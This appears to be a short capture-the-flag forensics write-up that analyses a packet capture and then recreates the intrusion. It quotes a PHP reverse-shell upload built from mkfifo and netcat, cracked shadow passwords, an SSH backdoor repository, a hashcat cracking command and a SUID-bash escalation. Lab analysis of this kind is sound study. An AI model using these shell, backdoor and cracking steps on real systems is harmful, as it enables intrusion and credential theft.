Reviewed capture. Saw two busiest users where 192.168.170.159 and 140.82.118.4

"Address","Packets","Bytes","Tx Packets","Tx Bytes","Rx Packets","Rx Bytes","Country","City","AS Number","AS Organization"
"192.168.170.159",3840,3753541,1727,185181,2113,3568360,"","","",""
"140.82.118.4",3228,3563541,1765,3474726,1463,88815,"","","",""
"192.168.170.145",608,189576,346,93372,262,96204,"","","",""
"192.168.170.1",21,10352,21,10352,0,0,"","","",""
"239.255.255.250",14,9772,0,0,14,9772,"","","",""
"192.168.170.2",4,424,2,262,2,162,"","","",""
"192.168.170.138",4,860,2,428,2,432,"","","",""
"224.0.0.251",4,400,0,0,4,400,"","","",""
"224.0.0.22",3,180,0,0,3,180,"","","",""
"91.189.91.157",2,180,1,90,1,90,"","","",""
"192.168.170.254",2,680,1,342,1,338,"","","",""

Used wireshark filter (ip.addr==140.82.118.4) || (ip.addr==192.168.170.159) to see their traffic.
Followed http traffic and found this upload:
	<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
	
Once Reverse shell was establish intruder used this to esc priv james: whenevernoteartinstant

Intruder continued to cat shadow. Found user passwords hackable by fasttrack word list.
	secuirty3        (paradox)
	secret12         (bee)
	abcd123          (szymex)
	1qaz2wsx         (muirland)

Attacker continued to install back door with git clone https://github.com/NinjaJc01/ssh-backdoor

	Found hard coded user hash and hard coded salt. 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05

With that I could use hash cat to break intruder pass:
	hashcat -m 1710 -o results.txt hash.txt /usr/share/wordlists/rockyou.txt

Once done had to recreate attack. Sshed into infected box.
	ssh james@<ip> -p 2222
	
Once there found used search to find
	find /home/james/ -perm /4000
	./.suid_bash -h
	./.suid_bash -p


